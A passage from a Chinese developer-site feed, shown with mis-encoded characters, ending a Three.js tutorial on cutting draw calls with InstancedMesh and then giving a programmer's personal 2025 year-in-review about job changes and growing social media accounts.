  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`InstancedMesh åˆ›å»ºå®Œæˆï¼Œå…± <span class="hljs-subst">${totalCount}</span> ä¸ªå®ä¾‹ï¼ŒDrawCall: 1`</span>);
  
}, <span class="hljs-literal">undefined</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'GLB åŠ è½½å¤±è´¥:'</span>, err));
</code></pre>
<h2 data-id="heading-7">âš ï¸ é‡è¦ï¼šæ–¹æ¡ˆå±€é™ä¸æ›¿ä»£æ–¹æ¡ˆ</h2>
<p><strong>æœ¬æ–‡æ–¹æ¡ˆæœ‰ä¸¤ä¸ªç¡¬å‰æï¼š</strong></p>
<ol>
<li><strong>200ä¸ªè®¾å¤‡å¿…é¡»æ˜¯ç›¸åŒå‡ ä½•ä½“</strong>ï¼ˆä¸€æ¨¡ä¸€æ ·çš„æ¨¡å‹ï¼‰</li>
<li><strong>ç»è¿‡çƒ˜ç„™ååªå‰©ä¸‹ä¸€ä¸ªæè´¨</strong>ï¼ˆæˆ–æœ€å¤šå‡ ä¸ªï¼Œä½†InstancedMeshè¦æ±‚åŒGeometry+åŒMaterialï¼‰</li>
</ol>
<p><strong>å¦‚æœä½ çš„åœºæ™¯æ˜¯200ä¸ªä¸åŒçš„è®¾å¤‡ï¼ˆä¸åŒå‹å·ã€ä¸åŒå‡ ä½•ä½“ï¼‰ï¼š</strong></p>
<ul>
<li><strong>BatchedMesh</strong>ï¼ˆThree.js r151+ï¼‰ï¼šæ”¯æŒä¸åŒå‡ ä½•ä½“åˆå¹¶ç»˜åˆ¶ï¼Œä½†æ§åˆ¶æ›´å¤æ‚</li>
<li><strong>Merge Geometry</strong>ï¼šæŠŠå¤šä¸ªä¸åŒå‡ ä½•ä½“åˆå¹¶æˆä¸€ä¸ªå¤§çš„BufferGeometryï¼Œé€‚åˆé™æ€åœºæ™¯ï¼ˆç¼ºç‚¹æ˜¯å¤±å»å•ä¸ªè®¾å¤‡çš„æ§åˆ¶èƒ½åŠ›ï¼Œæ— æ³•å•ç‹¬ç‚¹å‡»é€‰ä¸­ï¼‰</li>
<li><strong>LOD + Frustum Culling</strong>ï¼šè¿œå¤„è®¾å¤‡é™ä½ç²¾åº¦ï¼Œè§†é‡å¤–è®¾å¤‡ä¸æ¸²æŸ“</li>
<li><strong>æŒ‰éœ€åŠ è½½</strong>ï¼šåªæ¸²æŸ“è§†é‡å†…çš„è®¾å¤‡ï¼Œé…åˆOctreeç©ºé—´åˆ†å‰²</li>
</ul>
<p><strong>å…³äºäº¤äº’ï¼š</strong>
å¦‚æœéœ€è¦ç‚¹å‡»é€‰ä¸­æŸä¸ªè®¾å¤‡ï¼Œä½¿ç”¨<code>raycaster.intersectObject(instancedMesh)</code>ï¼Œé€šè¿‡<code>instanceId</code>å±æ€§çŸ¥é“ç‚¹ä¸­äº†ç¬¬å‡ ä¸ªå®ä¾‹ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>getMatrixAt</code>è·å–å…¶ä½ç½®ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-8">æ€»ç»“</h2>
<p>ä¼˜åŒ–è·¯å¾„ï¼š<strong>52000 DrawCallï¼ˆåŸå§‹ï¼‰â†’ 200 DrawCallï¼ˆçƒ˜ç„™åˆå¹¶ï¼‰â†’ 1 DrawCallï¼ˆInstancedMeshï¼‰</strong></p>
<p>æ ¸å¿ƒæ€è·¯å°±æ˜¯<strong>å‡å°‘CPUå‘GPUå‘é€ç»˜åˆ¶æŒ‡ä»¤çš„æ¬¡æ•°</strong>ã€‚Blenderè´Ÿè´£æŠŠ"å¤šMeshå¤šæè´¨"å˜æˆ"å•Meshå•æè´¨"ï¼ŒInstancedMeshè´Ÿè´£æŠŠ"ç»˜åˆ¶200æ¬¡"å˜æˆ"ç»˜åˆ¶1æ¬¡"ã€‚</p>
<p>å¦‚æœä½ çš„åœºæ™¯ä¹Ÿæ˜¯å¤§æ‰¹é‡é‡å¤è®¾å¤‡ï¼Œè¯•è¯•è¿™ä¸ªæ–¹æ¡ˆï¼Œè®©ä½ çš„å¸§ç‡é£èµ·æ¥~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025æ€»ç»“ï¼šä»åº”å±Šç”Ÿåˆ°å…¨ç½‘20Wç²‰ï¼Œâ€œç¨³å®šå‘ç–¯â€çš„ä¸€å¹´]]></title>    <link>https://juejin.cn/post/7598023360732200970</link>    <guid>https://juejin.cn/post/7598023360732200970</guid>    <pubDate>2026-01-22T12:52:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7598023360732200970" data-draft-id="7598023360732184586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025æ€»ç»“ï¼šä»åº”å±Šç”Ÿåˆ°å…¨ç½‘20Wç²‰ï¼Œâ€œç¨³å®šå‘ç–¯â€çš„ä¸€å¹´"/> <meta itemprop="keywords" content="ä»£ç è§„èŒƒ"/> <meta itemprop="datePublished" content="2026-01-22T12:52:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºçŒ¿è¿½"/> <meta itemprop="url" content="https://juejin.cn/user/1764043325192637"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025æ€»ç»“ï¼šä»åº”å±Šç”Ÿåˆ°å…¨ç½‘20Wç²‰ï¼Œâ€œç¨³å®šå‘ç–¯â€çš„ä¸€å¹´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1764043325192637/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºçŒ¿è¿½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T12:52:52.000Z" title="Thu Jan 22 2026 12:52:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    35
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0"><strong>ä¸€ã€2026å¹´åˆçš„ç¢ç¢å¿µ</strong></h2>
<p>å“ˆå–½ï¼Œå„ä½è§‚ä¼—è€çˆ·ä»¬å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯è¿½ã€‚</p>
<p>ç°åœ¨æ˜¯2026å¹´1æœˆï¼Œæ·±åœ³è¿™è¾¹ä¹Ÿå¼€å§‹é™æ¸©äº†ï¼Œè¶ç€æˆ‘çš„å¿ƒè¿˜æ²¡æœ‰å‡‰ï¼Œè°¨ä»¥æ­¤æ–‡è®°å½•æˆ‘çš„2025ã€‚</p>
<p>ä½œä¸ºä¸€ä¸ª25å±Šçš„åº”å±Šç”Ÿï¼Œå›çœ‹åˆšè¿‡å»çš„2025ï¼Œæ€»è§‰å¾—è·Ÿåšæ¢¦ä¸€æ ·ã€‚è™½ç„¶ç°åœ¨å…¨ç½‘ç´¯ç§¯äº†20Wç²‰ä¸ï¼Œä½†è€ç²‰éƒ½çŸ¥é“ï¼Œæˆ‘ä»21å¹´å¤§ä¸€å°±å¼€å§‹åšäº†ã€‚è¿™20Wç²‰ï¼Œç®—æ˜¯æˆ‘è·‘äº†å››å¹´çš„ä¸€ä¸ªäº¤ä»£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36081ab442be4550ad8f4e874be09f68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=dK2mF7jVGb8jmVb4pdukz2kPihc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1"><strong>äºŒã€ å¹´åˆåæ ‡ä¸Šæµ·</strong></h2>
<p>2025å¹´åˆé‚£ä¼šå„¿ï¼Œæˆ‘æ•´ä¸ªäººçŠ¶æ€å…¶å®æŒºå´©çš„ï¼Œè·Ÿæ¯•ä¸šç”Ÿä¸€æ ·ï¼Œåœ¨èµ¶æ˜¥æ‹›å¤©å¤©æµ·æŠ•å¤©å¤©é¢è¯•ã€‚æœ€åæ€»ç®—æ‹¿åˆ°äº†ä¸Šæµ·ä¸€å®¶ä¸Šå¸‚è½¦ä¼çš„è½¯ä»¶å¼€å‘çš„offerï¼Œå¿ƒé‡Œé‚£å—å¤§çŸ³å¤´æ‰ç®—è½äº†åœ°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81c92a0bf3c84fafb2a9f12ba01b1d26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=fkzU49qZO9ANxjM3itIFwL03TSI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2"><strong>ä¸‰ã€5æœˆç»ˆç« ï¼šæ¯•è®¾â€œå…¥ç¼–â€ä¸ç¬¬ä¸€åœºæ¼”å”±ä¼š</strong></h2>
<p>5æœˆä»½æ˜¯æ¯•ä¸šå‰æœ€åçš„ç–¯ç‹‚ã€‚æˆ‘å»çœ‹äº†äººç”Ÿç¬¬ä¸€åœºæ¼”å”±ä¼šï¼Œåœ¨å°ä¸‹å–Šåˆ°å—“å­å“‘æ‰ã€‚</p>
<p>å›å­¦æ ¡å‚åŠ ç­”è¾©ä¹Ÿå¾ˆé¡ºåˆ©ï¼Œæ‹¿åˆ°äº†â€œä¼˜ç§€æ¯•ä¸šç”Ÿâ€ã€‚æœ€è®©æˆ‘å¾—æ„çš„ï¼Œæ˜¯æˆ‘çš„æ¯•è®¾è¢«å­¦æ ¡ç›¸ä¸­ï¼Œç›´æ¥â€œå…¥ç¼–â€æ”¾åœ¨å›¾ä¹¦é¦†å±•è§ˆäº†ã€‚èµ°çš„é‚£å¤©æˆ‘è¿˜ä¸“é—¨å»çœ‹äº†çœ‹ï¼Œå¿ƒé‡Œä¹ç€ï¼šè¿™å››å¹´çš„å­¦æ²¡ç™½ä¸Šï¼Œå¥½æ­¹ç»™æ¯æ ¡ç•™äº†ç‚¹ä¸œè¥¿ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5649c504cb9644abbecd3c1632827e0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=hl%2Fya0%2FULLFbmjiZId4nCO2QS2I%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3"><strong>å››ã€7æœˆè½¬åœºï¼šå»æ·±åœ³</strong></h2>
<p>7æœˆæœ¬æ¥è¯¥è½¬æ­£äº†ï¼Œä½†å› ä¸ºä¸€äº›è¯´ä¸æ¸…æ¥šçš„å› ç´ ï¼ˆå¤§å®¶éƒ½æ‡‚ï¼ŒèŒåœºé‚£ç‚¹äº‹ï¼‰ï¼Œæˆ‘é€‰æ‹©äº†ç¦»èŒã€‚å½“æ—¶æ²¡æƒ³å¤ªå¤šï¼Œæ‹ç€è¡Œæç®±å°±å¥”å‘äº†æ·±åœ³ã€‚</p>
<p>äº‹å®è¯æ˜ï¼Œå¹´è½»äººç¡®å®è¯¥å¤šæŠ˜è…¾ã€‚ç°åœ¨æˆ‘åœ¨ä¸€å®¶955çš„å…¬å¸ï¼Œä¸æ€ä¹ˆåŠ ç­ï¼Œç¯å¢ƒä¹Ÿè‡ªç”±ã€‚è¯•ç”¨æœŸè¿˜æ²¡è¿‡ï¼Œè€æ¿å°±ä¸»åŠ¨ç»™æˆ‘æ¶¨äº†å·¥èµ„ï¼Œè¿™ç§è¢«è‚¯å®šçš„æ„Ÿè§‰çœŸçš„yydsã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e5eb10ede50435fa2e8d11f851c7533~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=vdd1O1Mf1z%2FZsNoRVypApHT0i74%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>äº”ã€8æœˆç”Ÿæ´»ï¼šçƒ«äº†å¤´ï¼Œçˆ¬äº†å±±ï¼Œæ‰¾å›äº†è‡ªå·±</strong></h2>
<p>8æœˆä»½ï¼Œæˆ‘å¼€å§‹å°è¯•ä¸€äº›ä»¥å‰æ²¡åšè¿‡çš„äº‹ã€‚å’Œä¸€ç¾¤â€œç‹æœ‹ç‹—å‹â€å»å¤œçˆ¬æ¢§æ¡å±±ï¼Œåœ¨å±±é¡¶å®ˆäº†ä¸€å¤œçœ‹æ—¥å‡ºã€‚</p>
<p>é‚£é˜µå­æˆ‘ä¹Ÿå˜äº†ä¸å°‘ï¼Œä¹°äº†å¾ˆå¤šåˆèº«çš„è¡£æœï¼Œå°è¯•äº†çƒ«å¤´ï¼ˆæ•ˆæœæ„å¤–åœ°éå¸¸æ»¡æ„ï¼‰ã€‚ä¸å†åªæ˜¯ä¸ºäº†æŸä¸ªç›®æ ‡å»èµ¶è·¯ï¼Œè€Œæ˜¯å¼€å§‹äº«å—è¿™ç§â€œé²œæ´»â€çš„æ„Ÿè§‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b05a78526b64445d91d2dedab9249d24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=8n49xJU9gMeCMb%2BHzPu6y3VLPWo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5"><strong>å…­ã€9-12æœˆï¼šå…¨å¹³å°å¼€èŠ±ï¼Œç–¯ç‹‚æé’±</strong></h2>
<p>9 æœˆä»½ï¼Œæˆ‘æŠŠé‡å¿ƒæ”¾åˆ°äº†å°çº¢ä¹¦ï¼Œç»“æœåŠä¸ªæœˆæ¶¨ç²‰ 2w+ï¼Œç›´æ¥å˜ç°äº†äº”ä½æ•°ï¼Œè¿™ç»™äº†æˆ‘æå¤§çš„åº•æ°”ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad43875e1c74f52b0645534ddddd74b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=JSz6HDJ7qHBHgKxLXHOXRTGTf1U%3D" alt="" loading="lazy"/></p>
<p>10 æœˆå¥–åŠ±äº†è‡ªå·±ä¸€å°å½±çŸ³ 360ï¼ŒåšæŠ–éŸ³ vlogï¼Œè™½ç„¶ç›®å‰è¿˜æ²¡æå‡ºä»€ä¹ˆåå ‚ï¼ˆhhhï¼‰ï¼Œä½†æŠ˜è…¾çš„è¿‡ç¨‹æœ¬èº«å°±å¾ˆçˆ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b0e6c27900049eea8a1c855109d1832~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=dYWiamMJbh%2BRZDtxJUTBjt6nK%2Bg%3D" alt="" loading="lazy"/></p>
<p>åˆ°äº† 11 æœˆï¼Œæˆ‘çš„ B ç«™ç²‰ä¸ä¹Ÿç´¯è®¡çªç ´äº† 10w+ï¼Œæ­£åœ¨åç­‰å°ç”µè§†å¥–ç‰Œã€‚æœŸé—´æˆ‘è¿˜æ”¶åˆ°äº†åä¸ºäº‘ã€é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€ææ˜Ÿä¼šç­‰ä¸€å †ä¸“å®¶çš„è£èª‰è¯ä¹¦ã€‚çº¿ä¸‹å‚åŠ ä¼šè®®ï¼Œè·Ÿå„è·¯æŠ€æœ¯å¤§ä½¬äº¤æµå­¦ä¹ æ—¶ï¼Œæˆ‘æ‰å‘ç°ï¼šåŸæ¥æˆ‘ä¹Ÿèƒ½è·Ÿä»–ä»¬ç«™åœ¨åŒä¸€ä¸ªé¢‘é“ä¸Šï¼Œå¤–é¢çš„ä¸–ç•ŒçœŸç²¾å½©ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed5affdab3f7487b85736581ef5c079f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=vH3YY%2FC%2Bfiar1KG13mV5Y1d9Fm4%3D" alt="" loading="lazy"/></p>
<p>12 æœˆï¼Œæˆ‘åˆå¼€å¯äº†å¾—ç‰©ç­‰å¹³å°å¸¦è´§ï¼Œè¿›å…¥ä¸€ä¸ªå…¨æ–°çš„èµ›é“ã€‚æ¯å¤©æ‹†å¿«é€’ã€æµ‹è¯„æ ·å“æˆäº†å¸¸æ€ï¼Œè¿˜æ„å¤–æ”¶åˆ°äº†å®˜æ–¹å¤§å¤§çš„æ„Ÿè°¢ä¿¡ã€‚è¿™ä¸€å¹´æ”¶å°¾å¾—æ¯”æˆ‘æƒ³è±¡ä¸­è¦ç²¾å½©ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bf6720ab6854584b746a99ccc1fe3e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=3XxGyYoJRPgD91dol%2FPG4YzT6ew%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9e373bebe81470fbffad250017fb322~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=XxzR6YyvNfdTjs0swlNDdLmSQQI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6"><strong>ä¸ƒã€å…³äºè‡ªåª’ä½“ä¸èŒåœºçš„ Q&amp;A</strong></h2>
<p><strong>é—®ï¼šä¸ºä»€ä¹ˆåšè¿™ä¹ˆå¤šè‡ªåª’ä½“è´¦å·ï¼Ÿ</strong></p>
<p><strong>ç­”ï¼š</strong> åœ¨æ¯•ä¸šä¹‹åä¸‰å¹´å†…ï¼Œæˆ‘æƒ³åœ¨æœ‰ç¨³å®šæ”¶å…¥çš„æƒ…å†µä¸‹ï¼Œå»å°è¯•ä¸åŒçš„èŒä¸šï¼Œå»ä½“éªŒä¸åŒçš„é…¸ç”œè‹¦è¾£ï¼Œå¤šå­¦ä¹ è‡ªå·±ä¹‹å‰æ²¡æœ‰æ¥è§¦è¿‡çš„è¡Œä¸šçŸ¥è¯†ä¸å„ä¸ªé¢†åŸŸçš„å¤§ç‰›ï¼›ä¾‹å¦‚ï¼Œä¸ºäº†æ‹æ‘„è§†é¢‘æˆ‘å­¦ä¼šäº†å†™è§†é¢‘è„šæœ¬ã€å‰ªæ˜ ï¼Œä¸ºäº†æ‹æ‘„vlogæˆ‘ä¸“é—¨æ‰¾æ‘„å½±å¤§ç‰›å­¦ä¹ æ‹æ‘„æŠ€å·§ï¼Œä¸ºäº†å­¦ä¹ æ‹æ‘„ç§è‰æ”»ç•¥ï¼Œä¸“é—¨å»å­¦ä¹ ç”µå•†çŸ¥è¯†ï¼ˆé€‰å“ï¼ŒæŠ•æµâ€¦â€¦ï¼‰ç­‰ç­‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3788158e555449db810eaadeaa43dda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_6L-9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770296234&amp;x-signature=Abn7XRAqo47jcyLGP2rVFh7Ms%2Fg%3D" alt="" loading="lazy"/></p>
<p><strong>é—®ï¼šå°çº¢ä¹¦åŠä¸ªæœˆå˜ç°äº”ä½æ•°ï¼ŒBç«™éƒ½åä¸‡ç²‰äº†ï¼Œä¸ºå•¥ä¸å¹²è„†è¾èŒå…¨èŒåšåšä¸»ï¼Ÿ</strong> <strong>ç­”ï¼š</strong> è¿™ä¸ªé—®é¢˜æˆ‘æ¯å¤©éƒ½è¦é—®è‡ªå·±ä¸‰éï¼ˆç¬‘æ­»æˆ‘äº†ï¼‰ã€‚ä½†æˆ‘ç°åœ¨æ‰æ¯•ä¸šç¬¬ä¸€å¹´ï¼Œæˆ‘è§‰å¾—ç¤¾ä¼šè¿™æ‰€â€œå¤§å­¦â€æˆ‘è¿˜æ²¡è¯»æ˜ç™½ã€‚å…¬å¸é‡Œé‚£ç§å¤„ç†å¤æ‚é—®é¢˜çš„é€»è¾‘ã€é¢†å¯¼çš„æ€ç»´æ–¹å¼ï¼Œæ˜¯å®¶é‡Œé‚£å¼ åŠå…¬æ¡Œç»™ä¸äº†æˆ‘çš„ã€‚ç°é˜¶æ®µï¼Œâ€œæ‰“å·¥â€æ˜¯æˆ‘çš„åº•æ°”ï¼Œâ€œè‡ªåª’ä½“â€æ˜¯æˆ‘çš„åº•åº§ï¼Œä¸¤æ¡è…¿èµ°è·¯ï¼Œæ­¥å­æ¯”è¾ƒç¨³ï¼Œæ‰èƒ½ä¸€æ­¥ä¸€ä¸ªè„šå°ï¼Œä¸å®¹æ˜“æ‹‰èƒ¯ã€‚</p>
<p><strong>é—®ï¼šä½ è¿™åˆæ˜¯ä¸Šç­åˆæ˜¯æå››äº”ä¸ªå¹³å°ï¼Œä¸ç´¯å—ï¼Ÿæ¯å¤©å‡ ç‚¹ç¡å•Šï¼Ÿ</strong> <strong>ç­”ï¼š</strong> è®²çœŸè¯ï¼ŒçœŸçš„å¥½ç´¯ï¼Œæƒ³ç›´æ¥åŸåœ°èººå¹³ã€‚ä½†ç›¸æ¯”äºèº«ä½“ä¸Šçš„ç´¯ï¼Œæˆ‘æ›´æ€•é‚£ç§â€œä¸€çœ¼æœ›åˆ°å¤´â€çš„æ— èŠã€‚æˆ‘å…¶å®æ²¡å•¥é«˜ç«¯çš„æ—¶é—´ç®¡ç†ï¼Œæ— éå°±æ˜¯ä¸‹ç­åï¼ŒæŠŠåˆ«äººåˆ·çŸ­è§†é¢‘çš„æ—¶é—´ç”¨æ¥å‰ªè§†é¢‘ï¼ŒæŠŠåˆ«äººå‘å‘†çš„æ—¶é—´ç”¨æ¥æƒ³è„šæœ¬ã€‚å¯¹æˆ‘æ¥è¯´ï¼Œè‡ªåª’ä½“ä¸æ˜¯åŠ ç­ï¼Œæ˜¯ç»™æˆ‘æœªæ¥æ›´å¥½çš„ç”Ÿæ´»ä¸€ä¸ªç­¹ç ã€‚</p>
